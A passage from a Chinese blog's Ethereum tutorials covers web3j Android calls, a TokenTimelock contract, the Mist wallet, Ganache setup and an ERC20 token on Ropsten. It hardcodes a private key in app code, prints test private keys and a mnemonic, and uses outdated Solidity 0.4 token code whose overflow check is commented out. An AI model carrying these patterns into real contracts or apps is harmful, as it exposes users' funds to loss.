BigInteger gasPrice, BigInteger gasLimit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleStorage_sol_SimpleStorage(contractAddress, web3j, credentials, gasPrice, gasLimit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SimpleStorage_sol_SimpleStorage <span class="title">load</span><span class="params">(String contractAddress, Web3j web3j, TransactionManager transactionManager, BigInteger gasPrice, BigInteger gasLimit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleStorage_sol_SimpleStorage(contractAddress, web3j, transactionManager, gasPrice, gasLimit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="生成合约Java代码"><a href="#生成合约Java代码" class="headerlink" title="生成合约Java代码"></a>生成合约Java代码</h3><p>确定环境搭建好了之后，就可以将我们的合约进行生成Java代码了</p>
<p>进入合约的目录，执行命令生成bin和abi文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── Migrations.sol</span><br><span class="line">├── StandardToken.sol</span><br><span class="line">├── TeaToken.sol</span><br><span class="line">└── Token.sol</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> solcjs *.sol   --optimize  --bin --abi</span></span><br></pre></td></tr></table></figure>
<p>为了减少路径的输入，我把所有的bin和abi文件拷贝到web3j目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> web3j-3.4.0/bin</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tree</span></span><br><span class="line">.</span><br><span class="line">├── Migrations_sol_Migrations.abi</span><br><span class="line">├── Migrations_sol_Migrations.bin</span><br><span class="line">├── StandardToken_sol_StandardToken.abi</span><br><span class="line">├── StandardToken_sol_StandardToken.bin</span><br><span class="line">├── TeaToken_sol_TeaToken.abi</span><br><span class="line">├── TeaToken_sol_TeaToken.bin</span><br><span class="line">├── Token_sol_Token.abi</span><br><span class="line">├── Token_sol_Token.bin</span><br><span class="line">├── web3j</span><br><span class="line">└── web3j.bat</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./web3j solidity generate TeaToken_sol_TeaToken.bin TeaToken_sol_TeaToken.abi -o ./ -p com.github.contract</span></span><br><span class="line"></span><br><span class="line">              _      _____ _     _</span><br><span class="line">             | |    |____ (_)   (_)</span><br><span class="line">__      _____| |__      / /_     _   ___</span><br><span class="line">\ \ /\ / / _ \ '_ \     \ \ |   | | / _ \</span><br><span class="line"> \ V  V /  __/ |_) |.___/ / | _ | || (_) |</span><br><span class="line">  \_/\_/ \___|_.__/ \____/| |(_)|_| \___/</span><br><span class="line">                         _/ |</span><br><span class="line">                        |__/</span><br><span class="line"></span><br><span class="line">Generating com.github.contract.TeaToken_sol_TeaToken ... File written to .</span><br><span class="line">.</span><br><span class="line">├── com</span><br><span class="line">│   └── github</span><br><span class="line">│       └── contract</span><br><span class="line">│           └── TeaToken_sol_TeaToken.java</span><br><span class="line">├── Migrations_sol_Migrations.abi</span><br><span class="line">├── Migrations_sol_Migrations.bin</span><br><span class="line">├── StandardToken_sol_StandardToken.abi</span><br><span class="line">├── StandardToken_sol_StandardToken.bin</span><br><span class="line">├── TeaToken_sol_TeaToken.abi</span><br><span class="line">├── TeaToken_sol_TeaToken.bin</span><br><span class="line">├── Token_sol_Token.abi</span><br><span class="line">├── Token_sol_Token.bin</span><br><span class="line">├── web3j</span><br><span class="line">└── web3j.bat</span><br></pre></td></tr></table></figure>
<p>将生成的 <code>TeaToken_sol_TeaToken.java</code> 拷贝到Android项目</p>
<h3 id="调用合约代码"><a href="#调用合约代码" class="headerlink" title="调用合约代码"></a>调用合约代码</h3><p>注意：合约要预先部署好，下面这是在Java、Android上部署合约的代码，一般不会再Android App上部署合约，可以用Java程序或者truffle来部署合约。</p>
<p>部署合约的账号拥有所有的代币，可以通过转账发给其他账户。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TeaToken_sol_TeaToken contract = TeaToken_sol_TeaToken.deploy(web3j, credentials1, GAS_PRICE, GAS_LIMIT).send();</span><br></pre></td></tr></table></figure>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTransferSmartContracts</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//合约地址</span></span><br><span class="line">     <span class="keyword">final</span> String contractAddress = <span class="string">"0x6bee29c36f1633db9c4dfb4e445fccd8c4dd8023"</span>;</span><br><span class="line"></span><br><span class="line">     EthCoinbase coinbase = web3j.ethCoinbase().sendAsync().get();</span><br><span class="line">     <span class="keyword">final</span> String coinbaseAddress = coinbase.getAddress();</span><br><span class="line">     <span class="keyword">final</span> String formKey = <span class="string">"58e7f34b59a828d1dc37a97a921b55de0cb8cedea91b1e09b490f39264b151ce"</span>;</span><br><span class="line">     <span class="comment">//签名</span></span><br><span class="line">     Credentials credentials = Credentials.create(formKey);</span><br><span class="line">     <span class="comment">//收款地址</span></span><br><span class="line">     <span class="keyword">final</span> String toAddress = <span class="string">"0x9958eC47C8286DC89F5CbCbD842458bD43540a7D"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//通过合约地址加载合约</span></span><br><span class="line">     TeaToken_sol_TeaToken contract = TeaToken_sol_TeaToken.load(contractAddress,web3j,credentials,GAS_PRICE, GAS_LIMIT);</span><br><span class="line">     BigInteger totalSupply = contract.totalSupply().sendAsync().get();</span><br><span class="line">     Log.e(TAG, <span class="string">"totalSupply = "</span>+ totalSupply );</span><br><span class="line">     BigInteger balanceOf = contract.balanceOf(coinbaseAddress).sendAsync().get();</span><br><span class="line">     Log.e(TAG, <span class="string">"balanceOf = "</span>+ balanceOf );</span><br><span class="line"></span><br><span class="line">     TransactionReceipt transactionReceipt =  contract.transfer(toAddress,<span class="keyword">new</span> BigInteger(<span class="string">"10000000000000000000"</span>)).sendAsync().get();</span><br><span class="line">     Log.e(TAG, <span class="string">"Status = "</span>+transactionReceipt.getStatus());</span><br><span class="line">     Log.e(TAG, <span class="string">"GasUsed = "</span>+transactionReceipt.getGasUsed());</span><br><span class="line">     Log.e(TAG, <span class="string">"TransactionHash = "</span>+transactionReceipt.getTransactionHash());</span><br><span class="line"></span><br><span class="line">     Log.e(TAG, <span class="string">"BlockHash = "</span>+transactionReceipt.getBlockHash());</span><br><span class="line">     Log.e(TAG, <span class="string">"BlockNumberRaw = "</span>+transactionReceipt.getBlockNumberRaw());</span><br><span class="line">     Log.e(TAG, <span class="string">"BlockNumber = "</span>+transactionReceipt.getBlockNumber());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>运行Android日志</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">totalSupply = <span class="number">10000000000000000000000</span></span><br><span class="line">balanceOf = <span class="number">10000000000000000000000</span></span><br><span class="line">Status = <span class="number">0</span>x1</span><br><span class="line">GasUsed = <span class="number">51511</span></span><br><span class="line">TransactionHash = <span class="number">0</span>x9389ffcc09dd8d17023e49f5487b95e41ff537a83282a85abc606da7ab99d37c</span><br><span class="line">BlockHash = <span class="number">0</span>x1447cbd6e36dca635a5cce39d35d3cafc7bd3b6b57d53fc338968b14c172019e</span><br><span class="line">BlockNumberRaw = <span class="number">0</span>x7</span><br><span class="line">BlockNumber = <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>运行Canache日志</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">[上午<span class="number">11</span>:<span class="number">08</span>:<span class="number">06</span>]   Transaction: <span class="number">0</span>x9389ffcc09dd8d17023e49f5487b95e41ff537a83282a85abc606da7ab99d37c</span><br><span class="line">[上午<span class="number">11</span>:<span class="number">08</span>:<span class="number">06</span>]   Gas usage: <span class="number">51511</span></span><br><span class="line">[上午<span class="number">11</span>:<span class="number">08</span>:<span class="number">06</span>]   Block Number: <span class="number">7</span></span><br><span class="line">[上午<span class="number">11</span>:<span class="number">08</span>:<span class="number">06</span>]   Block Time: Sat Dec <span class="number">29</span> <span class="number">2018</span> <span class="number">11</span>:<span class="number">08</span>:<span class="number">06</span> GMT+<span class="number">0800</span> (中国标准时间)</span><br><span class="line">[上午<span class="number">11</span>:<span class="number">08</span>:<span class="number">06</span>] eth_getTransactionReceipt</span><br></pre></td></tr></table></figure>
<p>好了，后续的功能一样的，可以查询账号余额等。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2.2、solidity编写锁仓合约</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/2.2%E3%80%81solidity%E7%BC%96%E5%86%99%E9%94%81%E4%BB%93%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<p>所谓“锁仓合约”是指，用合约作为第三方托管资金，进行两方交易，并且有时间限制。</p>
<p>举个简单的例子：<br>一位老板雇佣一位工人工作10天，老板怕工人中途跑路，工人怕老板是奸商发不发工资，那么第三方托管是不错的选择，但是我们可以通过锁仓合约来实现，更加公正。</p>
<p>实现：老板创建一个锁仓合约，把钱转到合约上，10天后工人可以申请释放金额，但是没有到10天（如第9天）工人都无法把钱取出。</p>
<p>这个就是“时间锁”。</p>
<p><code>OpenZeppelin</code> 项目已经实现了时间锁，我们可以基于它来修改适合我们的需求，来看看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;./SafeERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TokenTimelock</span><br><span class="line"> * @dev TokenTimelock is a token holder contract that will allow a</span><br><span class="line"> * beneficiary to extract the tokens after a given release time</span><br><span class="line"> */</span><br><span class="line">contract TokenTimelock &#123;</span><br><span class="line">  using SafeERC20 for ERC20Basic;</span><br><span class="line"></span><br><span class="line">  // ERC20 basic token contract being held</span><br><span class="line">  ERC20Basic public token;</span><br><span class="line"></span><br><span class="line">  // beneficiary of tokens after they are released</span><br><span class="line">  address public beneficiary;</span><br><span class="line"></span><br><span class="line">  // timestamp when token release is enabled</span><br><span class="line">  uint256 public releaseTime;</span><br><span class="line"></span><br><span class="line">  // 构造函数，在合约创建时运行</span><br><span class="line">  // _token 是指代币的地址，代表代币的种类</span><br><span class="line">  // _beneficiary 是收款的账号地址</span><br><span class="line">  // _releaseTime 是一个Unix时间戳（秒），表示过了这个时间就可以释放代币</span><br><span class="line">  constructor(</span><br><span class="line">    ERC20Basic _token,</span><br><span class="line">    address _beneficiary,</span><br><span class="line">    uint256 _releaseTime</span><br><span class="line">  )</span><br><span class="line">    public</span><br><span class="line">  &#123;</span><br><span class="line">    // solium-disable-next-line security/no-block-members</span><br><span class="line">    require(_releaseTime &gt; block.timestamp);</span><br><span class="line">    token = _token;</span><br><span class="line">    beneficiary = _beneficiary;</span><br><span class="line">    releaseTime = _releaseTime;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * 这个是释放代币的函数，需要人为调用，如果调用成功，代币将转到beneficiary</span><br><span class="line">   * @notice Transfers tokens held by timelock to beneficiary.</span><br><span class="line">   */</span><br><span class="line">  function release() public &#123;</span><br><span class="line">    // solium-disable-next-line security/no-block-members</span><br><span class="line">    require(block.timestamp &gt;= releaseTime);</span><br><span class="line"></span><br><span class="line">    uint256 amount = token.balanceOf(address(this));</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line"></span><br><span class="line">    token.safeTransfer(beneficiary, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本文只是讲一个简单的时间锁，另外还有断崖式持续锁仓（<code>OpenZeppelin</code>已实现）等可以自由实现。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>3、以太坊钱包Mist</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/3%E3%80%81%E4%BB%A5%E5%A4%AA%E5%9D%8A%E9%92%B1%E5%8C%85Mist/</url>
    <content><![CDATA[<blockquote>
<p>参考这篇文章: <a href="https://zhuanlan.zhihu.com/p/29010231" target="_blank" rel="noopener">玩转以太坊(Ethereum)的测试网络</a></p>
</blockquote>
<p>以下是我在Ubuntu18.04下使用 <code>Mist</code> 记录</p>
<h2 id="安装钱包-Mist"><a href="#安装钱包-Mist" class="headerlink" title="安装钱包(Mist)"></a>安装钱包(Mist)</h2><p>下载Mist: <a href="https://github.com/ethereum/mist/releases" target="_blank" rel="noopener">https://github.com/ethereum/mist/releases</a> (这里安装的是 Mist-linux64-0-10-0.zip)</p>
<p>Mist其实只是以太坊钱包的一个图形界面，后端还是官方的Geth。</p>
<p><a href="https://www.jianshu.com/p/f813784cd8af" target="_blank" rel="noopener">Mist和Ethereum Wallet有什么区别</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 先安装geth</span><br><span class="line">$ sudo apt-get install software-properties-common</span><br><span class="line">$ sudo add-apt-repository -y ppa:ethereum/ethereum</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install ethereum</span><br><span class="line"></span><br><span class="line"># 下载的zip包，解压运行Mist</span><br><span class="line"># 启动提示缺少libgconf-2.so.4</span><br><span class="line">$ sudo apt-get install libgconf2-4</span><br></pre></td></tr></table></figure>
<h2 id="选择网络"><a href="#选择网络" class="headerlink" title="选择网络"></a>选择网络</h2><p>这个版本启动就默认选择了主网络，点击 “LAUNCH APPLICATION!” 进入主界面，在顶部菜单中选择 <code>Rinkeby-Test Network</code> 或者 <code>Ropsten Test Network</code></p>
<h2 id="创建账号"><a href="#创建账号" class="headerlink" title="创建账号"></a>创建账号</h2><p>输入密码就可以创建在测试网络的账号。</p>
<h2 id="获取测试网络上的以太币"><a href="#获取测试网络上的以太币" class="headerlink" title="获取测试网络上的以太币"></a>获取测试网络上的以太币</h2><p>Ropsten 网络直接点击 <code>Buy</code> 就可以了。</p>
<p><a href="https://faucet.rinkeby.io/" target="_blank" rel="noopener">传送门</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2.1、solidity编写合约学习</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/2.1%E3%80%81solidity%E7%BC%96%E5%86%99%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p><a href="https://solidity.readthedocs.io/en/v0.5.10/" target="_blank" rel="noopener">英文文档v0.5.10</a><br><a href="https://solidity-cn.readthedocs.io/zh/develop/" target="_blank" rel="noopener">中文文档develop</a></p>
<h3 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h3><ul>
<li><a href="https://ethereum.github.io/browser-solidity/" target="_blank" rel="noopener">Remix IDE Github</a> – 推荐，速度快。</li>
<li><p><a href="https://remix.ethereum.org/" target="_blank" rel="noopener">Remix IDE Org</a><br>基于浏览器的 IDE，集成了编译器和 Solidity 运行时环境，不需要服务端组件。</p>
</li>
<li><p><a href="https://plugins.jetbrains.com/plugin/9475-intellij-solidity" target="_blank" rel="noopener">IntelliJ IDEA plugin</a><br>IntelliJ IDEA 的 Solidity 插件（可用于其他所有的 JetBrains IDE）</p>
</li>
<li><a href="https://packagecontrol.io/packages/Ethereum/" target="_blank" rel="noopener">SublimeText — Solidity language syntax</a><br>SublimeText 编辑器的语法高亮包。</li>
</ul>
<p>### </p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>5.0、搭建Ganache测试私链环境</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/5.0%E3%80%81%E6%90%AD%E5%BB%BAGanache%E5%92%8CGanache-Cli%E6%B5%8B%E8%AF%95%E7%A7%81%E9%93%BE%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<blockquote>
<p>与 <code>Ropsten Test Net</code> 一样，现在我们在私有链发布一个Token，私有链前面使用了<code>Geth</code>来实现，本文通过 <code>ganache</code>来作为本地测试私有链。<br><code>ganache</code> 是一个基于内存的以太坊链，用于本地测试，安装简单，不用去连接测试网络，省去同步以太坊区块的麻烦。</p>
<p>最关键是为后面的truffle框架做铺垫。</p>
</blockquote>
<h4 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h4><ol>
<li><p>ganache 是GUI程序。（需要nodejs环境）</p>
<p><a href="https://github.com/trufflesuite/ganache/releases" target="_blank" rel="noopener">下载地址 https://github.com/trufflesuite/ganache/releases</a> </p>
<p>支持Linux、Mac和Windows ，本文直接安装Windows的，启动就可以，运行后默认创建10个账号，每个账号里有100ETH的余额。</p>
<p><img src="/images/blockchain/ganache.png" alt="ganache.png"></p>
<p>默认是127.0.0.1，只有本地能访问，修改为WLAN局域网内可以访问。</p>
<p><img src="/images/blockchain/ganache_conf.png" alt="ganache_conf.png"></p>
</li>
<li><p>ganache-cli 是字符终端程序（需要nodejs环境）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g ganache-cli</span><br><span class="line">$ ganache-cli</span><br><span class="line">Ganache CLI v6.1.0 (ganache-core: 2.1.0)</span><br><span class="line"></span><br><span class="line">Available Accounts</span><br><span class="line">==================</span><br><span class="line">(0) 0xef1e0310ecf99c3808940d351b8a4bd7566d0a71</span><br><span class="line">(1) 0xa91b4c17ff43421754a8b721a8e55ac2881d946b</span><br><span class="line">(2) 0x0a6d612ce9d06ee9bced7395f29b0167e059207e</span><br><span class="line">(3) 0xd64f06e3a98a41bea2a6fa290e742083206ee061</span><br><span class="line">(4) 0xd315be81ca72314a2434df898fe962e6b53db337</span><br><span class="line">(5) 0xd4b54a13c047214bfae17ee2e25bbe4891edf582</span><br><span class="line">(6) 0x630b76b384c423c231bbc3384b1333369296eff9</span><br><span class="line">(7) 0x5f10c0cc0a914d9e5711a4ae022c27f4be7013d4</span><br><span class="line">(8) 0xd7c06d6f55c44125a11d7d203bb24c86f786b37d</span><br><span class="line">(9) 0x2fc8126d7ea755089dc7337fe956f2f0369a205b</span><br><span class="line"></span><br><span class="line">Private Keys</span><br><span class="line">==================</span><br><span class="line">(0) 82d925b9235dcf17d2e7cb0907084bf44fa9ce7ab31a9d2375b5db75e2da0509</span><br><span class="line">(1) 3f02535f00fa0ab48c306e561491cb4e10c684cea0297ec23aa4e87322108723</span><br><span class="line">(2) a0c830651cac356ce0a1a1d471ae0a77d2f0cfbb869dbd2d7650d4827becf879</span><br><span class="line">(3) 60a0a77161316406a5c03453d9e85427357f4046939bd4f884561cc806a4dccf</span><br><span class="line">(4) 7914c24a44119f21071b2a7da59a4b07a8c665475b995e0491bf62e7b1cc0403</span><br><span class="line">(5) bc512c5af4b68021be1ea084e93acf87fd3c1dea4a3ad1eec60cc0ba408f5ac0</span><br><span class="line">(6) 2f1831f2ab30d0b091a4dced5dcac68c79fad0352727a5ab4edd694c3a9d4bd7</span><br><span class="line">(7) 963d08d6060e01eb9223e742f12955daf00f5cc54220001ce75353a50a017968</span><br><span class="line">(8) e3d724fa1a859afda107e9be2e3b0d5703705436bae1057280b8363bc6929fd8</span><br><span class="line">(9) 6a661a59913f97e6fbd9cc4d56e8fc4d6c098d7be14254d788a5917cfe498bfd</span><br><span class="line"></span><br><span class="line">HD Wallet</span><br><span class="line">==================</span><br><span class="line">Mnemonic:      penalty until vessel limit motor waste rule ability soft moral stem harsh</span><br><span class="line">Base HD Path:  m/44&apos;/60&apos;/0&apos;/0/&#123;account_index&#125;</span><br><span class="line"></span><br><span class="line">Listening on localhost:8545</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>4、基于Ropsten测试网络用Remix发布Token(代币)</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/4%E3%80%81%E5%9F%BA%E4%BA%8ERopsten%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E7%94%A8Remix%E5%8F%91%E5%B8%83Token(%E4%BB%A3%E5%B8%81)/</url>
    <content><![CDATA[<blockquote>
<p>参考<a href="https://www.jianshu.com/p/ce9417905b97" target="_blank" rel="noopener">《以太坊发token教程》</a><br>本文只记录操作流程，在Ropsten Test Net下操作（非私有链），用MetaMask和Remix-ide来完成发行部署。</p>
</blockquote>
<h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ol>
<li>安装MetaMask钱包，在Ropsten网络创建和登录账号( <code>0xBCdc478c31Bb569AFc9ed986E869f62A117a4Cae</code> ),这个账号将会是我们的智能合约的所有者，token发行数量都是存入到这个账号.</li>
<li>在MetaMask的Buy按钮，去领一些以太坊测试币(request 1 eth from faucet 按钮点一次领一个币)，用于部署合约。</li>
</ol>
<h4 id="编写Token的合约代码"><a href="#编写Token的合约代码" class="headerlink" title="编写Token的合约代码"></a>编写Token的合约代码</h4><p>接口(ERC20标准)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @return 返回token的发行量</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">totalSupply</span>(<span class="params"></span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256 supply</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @param _owner 查询以太坊地址token余额</span></span><br><span class="line">    <span class="comment">/// @return 返回余额</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256 balance</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice msg.sender（交易发送者）发送 _value（一定数量）的 token 到 _to（接受者）  </span></span><br><span class="line">    <span class="comment">/// @param _to 接收者的地址</span></span><br><span class="line">    <span class="comment">/// @param _value 发送token的数量</span></span><br><span class="line">    <span class="comment">/// @return 是否成功</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice 发送者 发送 _value（一定数量）的 token 到 _to（接受者）  </span></span><br><span class="line">    <span class="comment">/// @param _from 发送者的地址</span></span><br><span class="line">    <span class="comment">/// @param _to 接收者的地址</span></span><br><span class="line">    <span class="comment">/// @param _value 发送的数量</span></span><br><span class="line">    <span class="comment">/// @return 是否成功</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint256 _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice 发行方 批准 一个地址发送一定数量的token</span></span><br><span class="line">    <span class="comment">/// @param _spender 需要发送token的地址</span></span><br><span class="line">    <span class="comment">/// @param _value 发送token的数量</span></span><br><span class="line">    <span class="comment">/// @return 是否成功</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @param _owner 拥有token的地址</span></span><br><span class="line">    <span class="comment">/// @param _spender 可以发送token的地址</span></span><br><span class="line">    <span class="comment">/// @return 还允许发送的token的数量</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allowance</span>(<span class="params">address _owner, address _spender</span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256 remaining</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 发送Token事件</span></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line">    <span class="comment">/// 批准事件</span></span><br><span class="line">    event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实现ERC20标准<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"./Token.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract StandardToken is Token &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//默认token发行量不能超过(2^256 - 1)</span></span><br><span class="line">        <span class="comment">//如果你不设置发行量，并且随着时间的发型更多的token，需要确保没有超过最大值，使用下面的 if 语句</span></span><br><span class="line">        <span class="comment">//Replace the if with this one instead.</span></span><br><span class="line">        <span class="comment">//if (balances[msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (balances[msg.sender] &gt;= _value &amp;&amp; _value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            balances[msg.sender] -= _value;</span><br><span class="line">            balances[_to] += _value;</span><br><span class="line">            Transfer(msg.sender, _to, _value);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">address _from, address _to, uint256 _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//向上面的方法一样，如果你想确保发行量不超过最大值</span></span><br><span class="line">        <span class="comment">//if (balances[_from] &gt;= _value &amp;&amp; allowed[_from][msg.sender] &gt;= _value &amp;&amp; balances[_to] + _value &gt; balances[_to]) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (balances[_from] &gt;= _value &amp;&amp; allowed[_from][msg.sender] &gt;= _value &amp;&amp; _value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            balances[_to] += _value;</span><br><span class="line">            balances[_from] -= _value;</span><br><span class="line">            allowed[_from][msg.sender] -= _value;</span><br><span class="line">            Transfer(_from, _to, _value);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256 balance</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">        allowed[msg.sender][_spender] = _value;</span><br><span class="line">        Approval(msg.sender, _spender, _value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">allowance</span>(<span class="params">address _owner, address _spender</span>) <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256 remaining</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> allowed[_owner][_spender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256)) allowed;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实现自己的Token(代币)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"./StandardToken.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract TeaToken is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//if ether is sent to this address, send it back.</span></span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Public variables of the token */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">    The following variables are OPTIONAL vanities. One does not have to include them.</span></span><br><span class="line"><span class="comment">    They allow one to customise the token contract &amp; in no way influences the core functionality.</span></span><br><span class="line"><span class="comment">    